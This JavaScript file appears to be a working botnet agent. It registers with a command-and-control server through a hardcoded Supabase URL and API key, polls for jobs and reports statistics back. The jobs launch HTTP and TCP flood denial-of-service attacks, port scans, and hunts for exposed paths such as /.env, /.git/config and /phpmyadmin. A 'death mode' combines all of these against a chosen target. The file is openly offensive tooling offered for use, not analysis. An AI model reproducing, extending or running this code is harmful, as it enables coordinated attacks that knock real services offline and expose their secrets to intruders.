/**
 * SECURITYFORGE TITAN AGENT V44.7 (OBSIDIAN UPLINK)
 * 
 * [PATCH LOG]
 * - FIXED: Silent Failures (Added verbose network error logging)
 * - FIXED: JSON Parse Crash on empty responses
 * - FEATURE: Immediate Heartbeat (Instant Node Registration)
 * - OPTIMIZATION: Zero-Dependency (Removed Axios requirement)
 */

const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const dns = require('dns');
const os = require('os');

// ==========================================
// 1. CONFIGURATION
// ==========================================
const C2_CONFIG = {
    url: "https://qbedywgbdwxaucimgiok.supabase.co",
    key: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo",
    pollInterval: 2000,
    reportInterval: 2000,
    heartbeatInterval: 10000 
};

const MACHINE_ID = crypto.createHash('md5').update(os.hostname()).digest('hex').substring(0, 12);
const SESSION_ID = crypto.randomBytes(4).toString('hex');
const NODE_ID = `${MACHINE_ID}-${SESSION_ID}`;

const STATE = {
    activeJob: null,
    running: false,
    stats: {
        totalReqs: 0,
        success: 0,
        failed: 0,
        latencySum: 0,
        latencyCount: 0,
        maxLatency: 0,
        startTime: 0
    },
    logs: [],
    priorityLogs: [],
    discovered: new Set(),
    activeTargets: new Set(),
    resolvedIp: null,
    dynamicPaths: [],
    lastReport: 0,
    lastHeartbeat: 0,
    ghostCalibration: {
        active: false,
        baselineLength: -1,
        variance: 0
    }
};

const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

const HTTP1_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Connection': 'keep-alive',
    'User-Agent': USER_AGENTS[0]
};

const BUFFERS = {
    JUNK: Buffer.allocUnsafe(1400).fill('X')
};

const STATIC_PATHS = [
    '/admin', '/cpanel', '/whm', '/webmail', '/dashboard', '/wp-admin', 
    '/login', '/user', '/auth', '/backup', '/db', '/phpmyadmin', 
    '/server-status', '/robots.txt', '/sitemap.xml', '/.env', '/.git/config'
];

const MUTATION_BASES = [
    '/config', '/db_connect', '/settings', '/setup', '/install', '/update',
    '/backup', '/dump', '/users', '/clients', '/orders', '/api', '/upload',
    '/shell', '/cmd', '/root', '/test', '/info', '/logs'
];

const EXTENSIONS = ['.php', '.html', '.json', '.xml', '.sql', '.zip', '.bak', '.txt', '.log'];

// ==========================================
// 2. UTILITIES
// ==========================================
const log = (msg, type = 'INFO') => {
    const entry = `[${type}] ${msg}`;
    console.log(entry);
    
    if (type === 'SUCCESS' || type === 'FOUND' || type === 'OPEN' || type === 'ERROR') {
        if (!STATE.discovered.has(entry)) {
            STATE.priorityLogs.push(entry);
            STATE.discovered.add(entry);
        }
    } else {
        if (STATE.logs.length < 20) STATE.logs.push(entry);
    }
};

const makeSupabaseRequest = (method, path, body = null, headers = {}) => {
    return new Promise((resolve) => {
        try {
            const url = new URL(`${C2_CONFIG.url}/rest/v1/${path}`);
            const options = {
                hostname: url.hostname,
                path: url.pathname + url.search,
                method: method,
                headers: {
                    'apikey': C2_CONFIG.key,
                    'Authorization': `Bearer ${C2_CONFIG.key}`,
                    'Content-Type': 'application/json',
                    ...headers
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', c => data += c);
                res.on('end', () => {
                    if (res.statusCode >= 400) {
                        console.error(`[API ERROR] ${method} ${path} -> ${res.statusCode} ${res.statusMessage}`);
                        // Don't resolve null immediately, maybe log response body
                        if (data) console.error('Response:', data);
                        resolve(null);
                        return;
                    }
                    try {
                        resolve(data ? JSON.parse(data) : null);
                    } catch (e) {
                        // Sometimes empty body on 204 is fine
                        resolve(null); 
                    }
                });
            });
            req.on('error', (e) => {
                console.error(`[NET ERROR] ${method} ${path}: ${e.message}`);
                resolve(null);
            });
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch (e) {
            console.error('[REQ BUILD ERROR]', e);
            resolve(null);
        }
    });
};

const getTargetDetails = (urlStr) => {
    try {
        const u = new URL(urlStr.startsWith('http') ? urlStr : 'http://' + urlStr);
        return {
            host: u.hostname,
            port: u.port || (u.protocol === 'https:' ? 443 : 80),
            path: u.pathname,
            protocol: u.protocol.replace(':', ''),
            isSsl: u.protocol === 'https:'
        };
    } catch { return null; }
};

const fetchPath = (target, path) => {
    return new Promise((resolve) => {
        const lib = target.isSsl ? https : http;
        const req = lib.get({ 
            host: target.host, 
            port: target.port, 
            path: path, 
            rejectUnauthorized: false, 
            headers: HTTP1_HEADERS 
        }, (res) => {
            let body = '';
            res.on('data', c => body += c);
            res.on('end', () => resolve({ code: res.statusCode, body: body, len: body.length }));
        });
        req.on('error', () => resolve({ code: 0, body: '', len: 0 }));
        req.end();
    });
};

// ==========================================
// 3. CORE LOGIC
// ==========================================

const calibrateGhosting = async (target) => {
    log('HUNTER: Calibrating Smart 404 Filter...', 'INFO');
    const randomPath = `/titan-${crypto.randomBytes(4).toString('hex')}`;
    const res = await fetchPath(target, randomPath);
    
    if (res.code === 200) {
        STATE.ghostCalibration.active = true;
        STATE.ghostCalibration.baselineLength = res.len;
        STATE.ghostCalibration.variance = Math.ceil(res.len * 0.10); // 10% tolerance
        log(`HUNTER: Server returns 200 OK for 404s (Size: ${res.len}b). Filtering active.`, 'warning');
    } else {
        log('HUNTER: Standard 404 detection active.', 'SUCCESS');
    }
};

const runSpider = async (target, checkMeta = true) => {
    if (!STATE.running) return;
    
    if (checkMeta) {
        log('SPIDER: Parsing robots.txt & sitemap.xml...', 'INFO');
        const robots = await fetchPath(target, '/robots.txt');
        if (robots.body) {
            const robotsRegex = new RegExp("Disallow: (\\S+)", "g");
            let m;
            while ((m = robotsRegex.exec(robots.body)) !== null) {
                const p = m[1].trim();
                if (p && !STATE.dynamicPaths.includes(p)) {
                    STATE.dynamicPaths.push(p);
                    log(`SPIDER: Found in robots.txt: ${p}`, 'FOUND');
                }
            }
        }
        const sitemap = await fetchPath(target, '/sitemap.xml');
        if (sitemap.body) {
             const locRegex = new RegExp("<loc>(.*?)<\\/loc>", "g");
             let m;
             while ((m = locRegex.exec(sitemap.body)) !== null) {
                try {
                    const u = new URL(m[1]);
                    if (!STATE.dynamicPaths.includes(u.pathname)) STATE.dynamicPaths.push(u.pathname);
                } catch {}
             }
        }
    }

    const bodyRes = await fetchPath(target, target.path);
    if (bodyRes.body) {
        const linkRegex = new RegExp('(?:href|src|action)=["\'](\/[^"\']+)["\']', 'g');
        let m;
        while ((m = linkRegex.exec(bodyRes.body)) !== null) {
            const p = m[1];
            if (p.length < 100 && !STATE.dynamicPaths.includes(p)) STATE.dynamicPaths.push(p);
        }
    }
    
    if (STATE.running) setTimeout(() => runSpider(target, false), 15000);
};

const runAdminHunter = (target) => {
    if (!STATE.running) return;
    const lib = target.isSsl ? https : http;

    const pathGenerator = function* () {
        for (const p of STATIC_PATHS) yield p;
        for (const base of MUTATION_BASES) {
            for (const ext of EXTENSIONS) {
                yield `${base}${ext}`;
            }
        }
    };

    const iterator = pathGenerator();

    const crawl = () => {
        if (!STATE.running) return;

        for (let i = 0; i < 5; i++) {
            const next = iterator.next();
            if (next.done) return; 

            const path = next.value;
            const fullUrl = `${target.isSsl?'https':'http'}://${target.host}${path}`;

            const req = lib.get({
                host: target.host, port: target.port, path: path, rejectUnauthorized: false, headers: HTTP1_HEADERS
            }, (res) => {
                let len = 0;
                res.on('data', c => len += c.length);
                res.on('end', () => {
                    let isGhost = false;
                    if (STATE.ghostCalibration.active && res.statusCode === 200) {
                        const diff = Math.abs(len - STATE.ghostCalibration.baselineLength);
                        if (diff <= STATE.ghostCalibration.variance) isGhost = true;
                    }
                    if (!isGhost && (res.statusCode === 200 || res.statusCode === 401 || res.statusCode === 403)) {
                        const msg = `HUNTER: FOUND ${fullUrl} [${res.statusCode}]`;
                        log(msg, 'FOUND');
                    }
                });
            });
            req.on('error', () => {});
            req.end();
        }
        setTimeout(crawl, 250);
    };
    crawl();
};

const runVortex = (job, target) => {
    log('VORTEX: Resolving Origin IP...', 'warning');
    dns.resolve4(target.host, (err, addresses) => {
        if (!err && addresses && addresses.length > 0) {
            STATE.resolvedIp = addresses[0];
            log(`VORTEX: LOCKED ON IP ${STATE.resolvedIp}`, 'SUCCESS');
            
            const ports = [21, 22, 25, 53, 80, 110, 443, 445, 1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017];
            let openPortsFound = 0;
            
            log(`VORTEX: Scanning ${ports.length} critical ports on ${STATE.resolvedIp}...`, 'INFO');

            ports.forEach(port => {
                const s = new net.Socket();
                s.setTimeout(2500);
                s.connect(port, STATE.resolvedIp, () => {
                    openPortsFound++;
                    const msg = `[OPEN] ${STATE.resolvedIp}:${port}`;
                    log(msg, 'OPEN');
                    
                    const attackType = (port === 53) ? 'DNS' : (port === 22) ? 'SSH' : 'TCP';
                    log(`VORTEX: Attacking Port ${port} (${attackType})...`, 'warning');
                    for(let k=0; k<10; k++) runSocketStress(job, target, attackType, port);
                    s.destroy();
                });
                s.on('error', () => s.destroy());
            });

            setTimeout(() => {
                if (openPortsFound === 0) {
                    log('VORTEX: No open ports confirmed. Engaging HTTP Flood on Domain.', 'warning');
                    const threads = Math.min(job.concurrency || 50, 500);
                    for(let i=0; i<threads; i++) {
                         setTimeout(() => runHttpFlood(job, target), i * 10);
                    }
                }
            }, 5000);

        } else {
            log('VORTEX: DNS Failed. Attacking Domain directly.', 'ERROR');
            const threads = Math.min(job.concurrency || 50, 500);
            for(let i=0; i<threads; i++) {
                 setTimeout(() => runHttpFlood(job, target), i * 10);
            }
        }
    });
};

const runSocketStress = (job, target, type, portOverride = null) => {
    let port = portOverride || target.port;
    const dest = STATE.resolvedIp || target.host;
    const attack = () => {
        if (!STATE.running) return;
        const s = new net.Socket();
        s.setTimeout(1000);
        s.connect(port, dest, () => {
            STATE.stats.success++;
            s.write(BUFFERS.JUNK);
            s.destroy();
        });
        s.on('error', () => { STATE.stats.failed++; s.destroy(); });
        if (STATE.running) setImmediate(attack);
    };
    attack();
};

const runHttpFlood = (job, target) => {
    const lib = target.isSsl ? https : http;
    const agent = new lib.Agent({ keepAlive: true, maxSockets: Infinity });
    
    const attack = () => {
        if (!STATE.running) return;
        let path = target.path;
        if (STATE.dynamicPaths.length > 0 && Math.random() > 0.7) {
            path = STATE.dynamicPaths[Math.floor(Math.random() * STATE.dynamicPaths.length)];
        }
        const req = lib.request({
            host: target.host,
            port: target.port,
            path: path,
            method: job.method,
            agent: agent,
            rejectUnauthorized: false,
            headers: HTTP1_HEADERS
        }, (res) => {
            STATE.stats.success++;
            res.resume();
            if (STATE.running) setImmediate(attack);
        });
        req.on('error', () => STATE.stats.failed++);
        if (job.method === 'POST') req.write(job.body || '{}');
        req.end();
    };
    attack();
};

// ==========================================
// 4. MAIN JOB CONTROL
// ==========================================
const startJob = async (job) => {
    if (STATE.running && STATE.activeJob?.id === job.id) return;
    
    STATE.activeJob = job;
    STATE.running = true;
    STATE.stats = { totalReqs: 0, success: 0, failed: 0, latencySum: 0, latencyCount: 0, maxLatency: 0, startTime: Date.now() };
    STATE.discovered.clear();
    STATE.dynamicPaths = [];
    
    log(`TITAN V44.7 | TARGET: ${job.target}`);
    const target = getTargetDetails(job.target);
    if (!target) return;

    if (job.use_admin_hunter || job.use_100_percent_death) {
        await calibrateGhosting(target);
    }

    if (job.use_100_percent_death) {
        log('WARNING: 100% DEATH MODE. FULL ASSAULT.', 'warning');
        runVortex(job, target); 
        runSpider(target);
        runAdminHunter(target);
    } else {
        if (job.use_admin_hunter) {
            runSpider(target);
            runAdminHunter(target);
        }
        const threads = Math.min(job.concurrency || 50, 1000); 
        log(`STARTING ${threads} ATTACK THREADS...`);
        for(let i=0; i<threads; i++) {
            setTimeout(() => runHttpFlood(job, target), i * 10);
        }
    }
};

const stopJob = () => {
    STATE.running = false;
    log("ENGINE STOPPED");
};

// ==========================================
// 5. SERVER & POLLING
// ==========================================
const sendHeartbeat = async () => {
    try {
        await makeSupabaseRequest('POST', 'swarm_nodes', {
            node_id: NODE_ID,
            last_seen: new Date().toISOString(),
            ip: STATE.resolvedIp || 'unknown',
            version: 'V44.7'
        }, { 'Prefer': 'resolution=merge-duplicates' });
        STATE.lastHeartbeat = Date.now();
    } catch (e) {
        console.error('Heartbeat Failed:', e.message);
    }
};

// Send immediate heartbeat
console.log("Initializing Uplink to C2: " + C2_CONFIG.url);
sendHeartbeat().then(() => console.log("Initial Heartbeat Sent.")).catch(e => console.error("Initial Heartbeat Failed:", e));

setInterval(() => {
    const now = Date.now();
    if (now - STATE.lastHeartbeat > C2_CONFIG.heartbeatInterval) {
        sendHeartbeat();
    }
}, 5000);

setInterval(async () => {
    if (STATE.running && STATE.activeJob) {
        const now = Date.now();
        const elapsed = (now - STATE.stats.startTime) / 1000;
        
        if (now - STATE.lastReport > C2_CONFIG.reportInterval) {
            const rps = STATE.stats.success / (elapsed || 1); 
            if (STATE.activeJob.duration && elapsed > STATE.activeJob.duration) {
                await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, { status: 'COMPLETED' });
                stopJob();
                return;
            }
            const payload = {
                current_rps: Math.round(rps),
                total_success: STATE.stats.success,
                total_failed: STATE.stats.failed
            };
            if (STATE.priorityLogs.length > 0 || STATE.logs.length > 0) {
                 const combined = [...STATE.priorityLogs, ...STATE.logs].slice(0, 50);
                 payload.logs = JSON.stringify(combined);
                 STATE.priorityLogs = [];
                 STATE.logs = [];
            }
            const res = await makeSupabaseRequest('PATCH', `jobs?id=eq.${STATE.activeJob.id}`, payload);
            if (res && res[0] && res[0].status === 'STOPPED') stopJob();
            STATE.lastReport = now;
        }
    } else {
        const jobs = await makeSupabaseRequest('GET', 'jobs?status=eq.PENDING&limit=1&select=*');
        if (jobs && Array.isArray(jobs) && jobs.length > 0) {
            const job = jobs[0];
            console.log("JOB RECEIVED:", job.id);
            await makeSupabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startJob(job);
        } else if (jobs === null) {
            // console.error("Poll Failed: Unable to fetch jobs.");
        }
    }
}, C2_CONFIG.pollInterval);

http.createServer((req, res) => res.end('Titan V44.7 Online')).listen(process.env.PORT || 3000);
console.log('SecurityForge Titan Agent V44.7 (Obsidian Uplink) Online | ID: ' + NODE_ID);
